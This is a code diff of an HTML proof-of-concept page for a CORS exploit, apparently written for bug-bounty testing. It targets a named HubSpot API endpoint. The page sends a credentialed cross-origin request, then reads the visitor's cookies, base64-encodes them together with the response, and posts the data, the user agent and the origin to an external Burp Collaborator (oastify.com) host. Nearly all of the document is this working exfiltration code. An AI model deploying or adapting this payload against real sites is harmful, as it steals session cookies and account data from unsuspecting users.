@@ -1,43 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit - Steal Data</title>
+    <title>CORS Exploit - Send Cookies to Collaborator</title>
 </head>
 <body>
     <h1>Loading...</h1>
     <script>
-    // This sends the request WITH cookies automatically
-    fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
-        method: 'POST',
-        credentials: 'include',  // This sends the cookies automatically!
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify([{
-            event: 'page_view',
-            properties: {
-                url: window.location.href,
-                timestamp: new Date().toISOString()
-            }
-        }])
-    })
-    .then(r => {
-        console.log('Status:', r.status);
-        console.log('Headers:', r.headers);
-        return r.text();
-    })
-    .then(data => {
-        // Send the response to attacker's server
-        fetch('https://9oy0iyp5vh26vwnaa7j703jnnet5hx5m.oastify.com', {
+    (function() {
+        // Send request with credentials
+        fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
             method: 'POST',
-            mode: 'no-cors',
+            credentials: 'include',  // This sends the cookies!
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                response: data,
-                origin: window.location.origin
-            })
+            body: JSON.stringify([{
+                event: 'page_view',
+                properties: {
+                    url: window.location.href,
+                    timestamp: new Date().toISOString()
+                }
+            }])
+        })
+        .then(response => {
+            return response.text().then(data => {
+                return {status: response.status, data: data};
+            });
+        })
+        .then(result => {
+            // Get cookies
+            var cookies = document.cookie || "No cookies found (HttpOnly)";
+            
+            // Encode in base64
+            var encodedCookies = btoa(unescape(encodeURIComponent(cookies)));
+            var encodedResponse = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
+            
+            // Send to Collaborator
+            var payload = {
+                cookies: encodedCookies,
+                cookies_raw: cookies,
+                response: encodedResponse,
+                response_raw: result,
+                origin: window.location.origin,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+            
+            return fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            });
+        })
+        .then(() => {
+            console.log('[+] Data sent to Collaborator!');
+        })
+        .catch(error => {
+            console.log('[-] Error:', error);
+            // Send error to Collaborator
+            fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    error: error.toString(),
+                    origin: window.location.origin
+                })
+            });
         });
-        console.log('Data sent to collaborator:', data);
-    })
-    .catch(e => console.log('Error:', e));
+    })();
     </script>
 </body>
 </html>
